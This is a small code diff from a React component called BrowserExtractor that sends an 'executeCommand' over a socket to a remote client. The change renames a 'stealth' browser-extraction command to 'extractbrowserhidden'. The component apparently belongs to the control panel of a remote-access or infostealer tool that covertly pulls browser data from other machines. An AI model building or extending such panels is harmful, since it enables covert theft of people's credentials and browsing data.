@@ -289,7 +289,7 @@ const BrowserExtractor = ({ client, socket }) => {
     setExtracting(true);
     setExtractionOutput('');
     setZipPath('');
-    const command = type === 'stealth' ? 'extractbrowserstealth' : 'extractbrowser';
+    const command = type === 'stealth' ? 'extractbrowserhidden' : 'extractbrowser';
     
     socket.emit('executeCommand', {
       clientId: client.id,
